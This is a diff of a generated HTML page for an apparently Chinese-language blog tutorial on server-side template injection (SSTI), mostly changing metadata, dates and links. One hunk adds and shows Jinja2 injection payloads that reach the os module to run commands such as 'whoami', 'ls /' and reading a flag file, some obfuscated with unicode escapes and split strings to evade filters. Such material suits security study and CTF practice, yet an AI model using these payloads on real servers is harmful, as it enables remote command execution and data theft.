@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
-    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=58266&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="前言 \u200b 进工作室面试的时候sql有关的问题一个都没答全，痛定思痛，这里系统的学一遍sql注入。 一、什么是sql注入 \u200b 通过恶意构造sql语句来获">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="什么是SSTI？ \u200b SSTI是一种发生在服务器端模板中的漏洞。当用户的输入返回时会经过一个模板渲染，SSTI漏洞就是恶意用户插入了可以破坏模板">
 <title>SSTI</title>
 
-<link rel='canonical' href='http://localhost:58266/p/ssti/'>
+<link rel='canonical' href='http://localhost:1313/p/ssti/'>
 
 <link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="SSTI">
-<meta property='og:description' content="前言 \u200b 进工作室面试的时候sql有关的问题一个都没答全，痛定思痛，这里系统的学一遍sql注入。 一、什么是sql注入 \u200b 通过恶意构造sql语句来获">
-<meta property='og:url' content='http://localhost:58266/p/ssti/'>
+<meta property='og:description' content="什么是SSTI？ \u200b SSTI是一种发生在服务器端模板中的漏洞。当用户的输入返回时会经过一个模板渲染，SSTI漏洞就是恶意用户插入了可以破坏模板">
+<meta property='og:url' content='http://localhost:1313/p/ssti/'>
 <meta property='og:site_name' content='liernian'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-03-26T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-03-26T00:00:00&#43;00:00'/>
 <meta name="twitter:title" content="SSTI">
-<meta name="twitter:description" content="前言 \u200b 进工作室面试的时候sql有关的问题一个都没答全，痛定思痛，这里系统的学一遍sql注入。 一、什么是sql注入 \u200b 通过恶意构造sql语句来获">
+<meta name="twitter:description" content="什么是SSTI？ \u200b SSTI是一种发生在服务器端模板中的漏洞。当用户的输入返回时会经过一个模板渲染，SSTI漏洞就是恶意用户插入了可以破坏模板">
     <link rel="shortcut icon" href="/favicon.ico" />
 
   
@@ -236,11 +236,11 @@
 
                             <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
                                 
-                                    <option value="http://localhost:58266/en/" >English</option>
+                                    <option value="http://localhost:1313/en/" >English</option>
                                 
-                                    <option value="http://localhost:58266/" selected>简体中文</option>
+                                    <option value="http://localhost:1313/" selected>简体中文</option>
                                 
-                                    <option value="http://localhost:58266/ar/" >عربي</option>
+                                    <option value="http://localhost:1313/ar/" >عربي</option>
                                 
                             </select>
                         </li>
@@ -370,7 +370,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">2025-07-03</time>
+                <time class="article-time--published">2025-03-26</time>
             </div>
         
 
@@ -385,7 +385,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 1 分钟
+                    阅读时长: 6 分钟
                 </time>
             </div>
         
@@ -1033,9 +1033,13 @@
 </span><span class="lnt">10
 </span><span class="lnt">11
 </span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{lipsum|attr(&#34;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#34;)|attr(&#34;\u0067\u0065\u0074&#34;)(&#34;\u006f\u0073&#34;)|attr(&#34;\u0070\u006f\u0070\u0065\u006e&#34;)(&#34;ls /&#34;)|attr(&#34;\u0072\u0065\u0061\u0064&#34;)()}}
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{lipsum.__globals__[&#39;os&#39;].popen(&#39;whoami&#39;).read()}}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">{{lipsum|attr(&#34;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#34;)|attr(&#34;\u0067\u0065\u0074&#34;)(&#34;\u006f\u0073&#34;)|attr(&#34;\u0070\u006f\u0070\u0065\u006e&#34;)(&#34;ls /&#34;)|attr(&#34;\u0072\u0065\u0061\u0064&#34;)()}}
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">{{joiner[&#34;__init__&#34;][&#34;__globals__&#34;][&#34;o&#34;&#34;s&#34;][&#34;pop&#34;+&#34;en&#34;](&#34;t&#34;&#34;ac /f???&#34;)[&#34;re&#34;&#34;ad&#34;]
 </span></span><span class="line"><span class="cl">()}}
@@ -1152,12 +1156,12 @@
             
                 
 <article class="">
-    <a href="/p/ssti/">
+    <a href="/p/sql%E6%B3%A8%E5%85%A5/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">SSTI</h2>
+            <h2 class="article-title">SQL注入</h2>
         </div>
     </a>
 </article>
